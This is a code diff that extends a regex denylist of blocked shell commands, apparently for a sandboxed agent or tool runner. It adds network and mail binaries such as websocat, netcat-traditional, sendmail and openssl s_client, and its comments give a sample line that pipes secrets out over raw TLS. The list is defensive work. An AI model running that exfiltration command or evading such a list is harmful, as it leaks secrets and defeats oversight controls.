@@ -53,6 +53,19 @@ export const BLOCKED_COMMANDS = [
   /\bftp\s/i,                               // ftp
   /\baria2c\s/i,                            // aria2c download utility
   /\btftp\s/i,                              // trivial FTP client
+  // ── R4-12: additional network / dual-use binaries (denylist STOPGAP) ──
+  // openssl present on every dev box gives a clean raw-TLS pipe
+  // (`openssl s_client -connect h:443 < secrets`), websocat is a pure network
+  // tool, and the mail senders relay to arbitrary destinations. This is a
+  // userland denylist, NOT a sound wall — the durable fix is the planned
+  // OS-level sandbox (Landlock / sandbox-exec). New/renamed binaries still slip.
+  /\bwebsocat\s/i,                          // websocat (network-only WebSocket client)
+  /\bnc\.traditional\s/i,                   // Debian netcat-traditional (the bare `\bnc\s` misses the dotted name)
+  /\bsendmail\s/i,                          // sendmail (relay mail to arbitrary dest)
+  /\bmail\s/i,                              // mail (relay mail to arbitrary dest)
+  /\bmailx\s/i,                             // mailx (relay mail to arbitrary dest)
+  /\bssmtp\s/i,                             // ssmtp (relay mail to arbitrary dest)
+  /\bopenssl\s+s_(client|server)\b/i,       // openssl s_client/s_server ONLY (raw TLS pipe); bare openssl dgst/x509/enc/genrsa stay allowed
   // `fetch`, `http`, `https`, `xh`, `httpie`, `curlie` are deliberately NOT
   // listed here as `\bword\s` patterns: that would false-positive on
   // legitimate non-network commands (`git fetch`, `npm fetch`). They are
